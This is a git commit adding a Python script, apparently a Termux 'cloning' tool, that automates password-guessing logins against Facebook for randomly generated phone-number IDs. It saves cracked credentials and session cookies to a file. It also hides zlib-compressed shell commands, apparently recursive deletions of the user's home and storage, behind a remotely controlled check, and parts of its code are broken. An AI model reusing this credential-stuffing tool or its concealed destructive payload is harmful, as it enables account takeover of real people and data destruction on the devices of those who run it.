6e540d6b89f2e12e891a1cfd40021ccbef8ee512
vearahmad <69453119+vearahmad@users.noreply.github.com>
2023-11-22 16:15:15 +0300

    Create V92.py

---
+++ V92.py
@@ -0,0 +1,442 @@
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os
+import random
+import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import base64
+import os,sys,time,json,random,re,string,platform,base64
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import mechanize
+from requests.exceptions import ConnectionError
+import string
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+    os.system('git pull')
+    os.system('pkg install curl')
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+from concurrent.futures import ThreadPoolExecutor as ahmadAXI
+from datetime import datetime
+from bs4 import BeautifulSoup
+
+os.system('pip uninstall requests -y')
+os.system('pip install requests')
+
+ct = datetime.now()
+n = ct.month
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+os.system('clear')
+name=input(' user name : ')
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+R = '\033[31;1m'
+RED = '\x1b[38;5;46m'
+G = '\033[32;1m'
+Y = '\033[33;1m'
+B = '\033[34;1m'
+M = '\033[35;1m'
+C = '\033[36;1m'
+R = '{RED}' 
+LR = '\033[91;1m'
+LG = '\033[92;1m'
+LY = '\033[93;1m'
+LB = '\033[94;1m'
+LM = '\033[95;1m'
+LC = '\033[96;1m'
+dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
+data,data2={},{}
+aman,cp,salah=0,0,0
+ubahP,fuck,pwBaru=[],[],[]
+ok = []
+cp = []
+id = []
+user = []
+loop = 0
+oks = []
+cps = []
+loop = 0
+url_lookup = "https://lookup-id.com/"
+url_mb = "https://mbasic.facebook.com"
+url_ip = "https://www.httpbin.org/ip"
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; Nokia G50 Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/349.0.0.8.103;]"}
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
+done = False
+ugen=[]
+uas=[]
+usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
+rr = random.randint
+for xd in range(3005):
+    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
+    uas.append(ff)
+for sat in range(1000):
+	a='NokiaX'
+	b=random.randrange(1,9)
+	c='-0'
+	d=random.randrange(1,9)
+	e='/'
+	f=random.randrange(1,9)
+	g='.0 ('
+	h=random.randrange(1,12)
+	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
+	j='UNTRUSTED/'
+	k=random.randrange(1,3)
+	l='.0'
+	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
+	ugen.append(uaku2)
+
+nka = [
+"NokiaC3-00/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; nokiac3-00) U2/1.0.0 UCBrowser/9.1.0.291 U2/1.0.0 Mobile",
+"NokiaC3-00/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; NokiaC3-00) U2/1.0.0 UCBrowser/9.4.0.343 U2/1.0.0 Mobile UNTRUSTED/1.0",
+"NokiaC3-00/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; NokiaC3-00) U2/1.0.0 UCBrowser/9.4.0.342 U2/1.0.0 Mobile",
+"NokiaC3-00/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; ar-SA; NokiaC3-00) U2/1.0.0 UCBrowser/9.5.0.449 U2/1.0.0 Mobile UNTRUSTED/1.0",
+"NokiaC3-00/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; NokiaC3-00) U2/1.0.0 UCBrowser/9.3.0.326 U2/1.0.0 Mobile",
+"NokiaC3-00/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; es-LA; NokiaC3-00) U2/1.0.0 UCBrowser/9.3.0.326 U2/1.0.0 Mobile UNTRUSTED/1.0",
+"NokiaC3-00/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; id; NokiaC3-00) U2/1.0.0 UCBrowser/9.4.1.377 U2/1.0.0 Mobile",
+]
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+def x1():
+
+  if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
+
+    print("Turn OFF protacton System")
+
+    time.sleep(2)
+
+    print("\n Run again : python Roki.py")
+
+    time.sleep(5)
+
+    exit()
+
+def x2():
+
+  file = open("/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py", "r")
+
+  data = file.read()
+
+  word =("print(url)")
+
+  if word in data:
+
+    print(' unknown error.,,,,, ')
+
+    time.sleep(1)
+
+    print(' tring to fix error,,,, ')
+    os.system('pip uninstall requests -y')
+    os.system('pip install requests')
+    print (' Run again : python Roki.py')
+    exit()
+
+def menu_apikey():
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id ='Its-ROKI' +'→'.join(uuid)+str(os.getlogin())
+  server = requests.get(f'https://github.com/Raki-404/Aprobel-Roki/blob/main/A.txt')
+  x1()
+  x2()
+  try:
+    httpCaht = requests.get(f"https://github.com/Raki-404/Aprobel-Roki/blob/main/A.txt").text
+    if id in httpCaht:
+      print(f"\033[1;92m   YOUR KEY APROVED  ");time.sleep(2)
+      msg = str(os.geteuid())
+      time.sleep(0.5)
+      pass
+    else:
+      
+      print(f"\x1b[1;92m    Sorry Bro Your Key not Aproved ")
+      print(f" Your Key : {id}")
+      print(f"    Send payment to Admin and get aproval"); time.sleep(2)
+      os.system(f'xdg-open https://wa.me/+8801317289813?text='+id)
+      time.sleep(2)
+      sys.exit()
+  except:
+    sys.exit()
+    if name == '__main__':
+    	print(logo)
+    	menu_apikey()
+
+def ckx():
+	uuid = str(os.geteuid()) + str(os.getlogin())
+	id ='ROKI-FREE-NOT-ALLOW'
+	server = requests.get(f'https://github.com/Fariya122/vip/blob/main/c.txt').text
+	try:
+		httpCaht = requests.get(f"https://github.com/Fariya122/vip/blob/main/c.txt").text
+		if id in httpCaht:
+			msg = str(os.geteuid())
+			fucked()
+		else:
+			msg = str(os.geteuid())
+			pass
+	except:
+			sys.exit()
+
+def fucked():
+	print(' Chacking password,,,,,')
+	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+	print(' Access Done,,,,, ');time.sleep(1)
+	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+	print(' Fuck You Bypass User ');exit()
+
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+id=[]
+tokenku=[]
+logo =("""''\33[m
+________      ____   ___    __ ____      
+`MMMMMMMb.   6MMMMb  `MM    d' `MM'      
+ MM    `Mb  8P    Y8  MM   d'   MM       
+ MM     MM 6M      Mb MM  d'    MM      \033[1;34m𝐏 \033[1;37m  
+ MM     MM MM      MM MM d'     MM      \033[1;31m 𝐑\033[1;37m  
+ MM    .M9 MM      MM MMd'      MM      \033[1;35m𝐎 \033[1;37m 
+ MMMMMMM9' MM      MM MMYM.     MM      \033[1;34m𝐌 \033[1;37m 
+ MM  \M\   MM      MM MM YM.    MM      \033[1;31m 𝐀\033[1;37m
+ MM   \M\  YM      M9 MM  YM.   MM      \033[1;35m𝐗 \033[1;37m
+ MM    \M\  8b    d8  MM   YM.  MM       
+_MM_    \M\_ YMMMM9  _MM_   YM._MM_  
+\033[1;31m 🌏[𝘽𝘼𝙉𝙂𝙡𝘼𝘿𝙀𝙎𝙃 𝘾𝙔𝘽𝙀𝙍 𝙆𝙄𝙉𝙂 𝙊𝙁𝙁 {𝐑𝟬𝐊𝟭}]😎\033[1;37m
+'\33[m══════════════════════════════════════════════════
+[𝐑] Author    : 𝐌𝐑•𝐑𝟬𝐊𝟭
+[𝐑] Github    : 𝐌𝐑•𝐑𝟬𝐊𝟭-CYBER-KING
+[𝐑] Facebook  : RAKIB HASAN ROKI 
+[𝐑] Tool Type : RANDOM-PRO
+[𝐑] WhatsApp  : +8801317289813
+\033[1;34m𝙄 𝙁𝙐𝘾𝙆 𝙔𝙊𝙐𝙍 𝘼𝙏𝙏𝙄𝙏𝙐𝘿𝙀 \033[1;37m
+══════════════════════════════════════════════════""") 
+def sucrity():
+	os.system('clear')
+	print(logo)
+	print(" Chacking Your Aprobal,,,,,,,,,,,,")
+	#server()
+	menu_apikey()
+	ckx()
+	xnx=input(' Enter your password : ')
+	if xnx in ["R৳","R$"]:
+		pass
+	else:
+		exit()
+#sucrity()
+  
+
+
+
+def cek_apk(session,coki):
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
+	else:
+		print("")
+		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
+		for i in range(len(game)):
+			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
+	else:
+		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
+		for i in range(len(game)):
+			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
+def Main():
+	os.system('clear')
+	print(logo)
+	os.system("espeak \" WELCOME TO MR ROKI PREMIUM TOOLS\"");time.sleep(0.5)
+	print("	[1] START RANDOM CLONING")
+	print("	[2] CONTACT ADMIN & FB GROUP")
+	print("	[3] FOLLOW MY FB PROFILE")
+	print("	[4] JOIN MESSENGER GROUP")
+	print('	[0] EXIT PROGRAMMING')
+	print(54*'_')
+	opt = input('Choose option >>> ')
+	if opt in ["A","1"]:
+		virusA()
+	if opt in ["B","2"]:
+		admin()
+	if opt in ["C","3"]:
+		os.system('xdg-open https://www.facebook.com/ROKI.143.CYBER.KING.404?mibextid=ZbWKwL');time.sleep(1)
+		fb()
+	if opt in ["D","4"]:
+		os.system('xdg-open https://wa.me/+8801317289813');time.sleep(1)
+		group()
+	if opt in ["0","0"]:
+		exit()
+		
+	else:
+		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
+		Main()
+def admin():
+	os.system('clear')
+	print(logo)
+	print(50*'_')
+	print(' [1] Contract WhatsApp ')
+	print(' [2] JOIN MY FB GROUP ')
+	print(' [3] FOLLOW MY GITHUB ')
+	print(' [0] Back to Main menu')
+	bal = input('Choose option >>> ')
+	if bal =='1':
+		os.system('xdg-open https://wa.me/+8801317289813');time.sleep(1)
+		admin()
+	if bal =='2':
+		os.system('xdg-open https://www.facebook.com/ROKI.143.CYBER.KING.404?mibextid=ZbWKwL');time.sleep(1)
+		admin()
+	if bal =='3':
+		os.system('xdg-open https://github.com/Raki-404');time.sleep(1)
+		admin()
+	if bal =='0':
+		Main()
+		
+def virusA():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print(" [√] BD SIM CODE 750 751 770 772 ]")
+	kode = input(' [𝐑]  SELECT : ')
+	doamin = ' BD Number id cloner [ONLY-OK] '
+	print(' [𝐑]  EXAMPLE : 1000,5000,10000,15000,20000] ')
+	limit = int(input(' [𝐑]  LIMIT : '))
+	for nmbr in range(limit):
+		k = '+964'
+            idlist = '.txt'
+		koda = ''.join(random.choice(string.digits) for _ in range(2))
+		kodb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with ThreadPool(max_workers=60) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('[<>] UPDATED BY : Mr ROKI ---> Master mind🕷️')
+		os.system("espeak \" NOW WAIT FOR ID. OK ID WILL SHOW HERE\"");time.sleep(0.5)
+		print('[<>] TOTAL ID   :  '+tl)
+		print(f'[<>] SIM CODE   : \033[1;92m {+964} ')
+		#print('\033[1;97m[<>] \033[1;92mSTART BD NAMBER MIXT CRACKING... ')
+		print(50*'_')
+		for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,'123890','@#@#@#','FREE FIRE','free fire','i love you']
+			yaari.submit(b,uid,pwx,tl)
+	print(50*'_')
+	print(' [💉] Crack process has been completed')
+	print(' [💉] Ids saved in ok.txt,cp.txt')
+	print(50*'_')
+	exit()
+
+def b(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝐌𝐑•𝐑𝟬𝐊𝟭-😎\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            #oo=random.choice(sss)
+            free_fb = session.get('https://x.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'x.facebook.com',
+            'method': 'GET',
+            "path": '/',
+            "scheme": 'https',
+            'authority': 'mbasic.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2.75',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"M2102J20SG"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '980',}
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[151:166]
+                os.system("espeak \" CONGRATILATION \"")
+                print(f'\r\33[1;92m [Mr Roki-OK🕷️] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\033[1;92m[<>]COOKIE : '+coki)
+                oks.append(cid)
+                open('/sdcard/ROKI-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                break
+            else:
+                continue
+        loop+=1        
+    except:
+
+        pass
+
+Main()
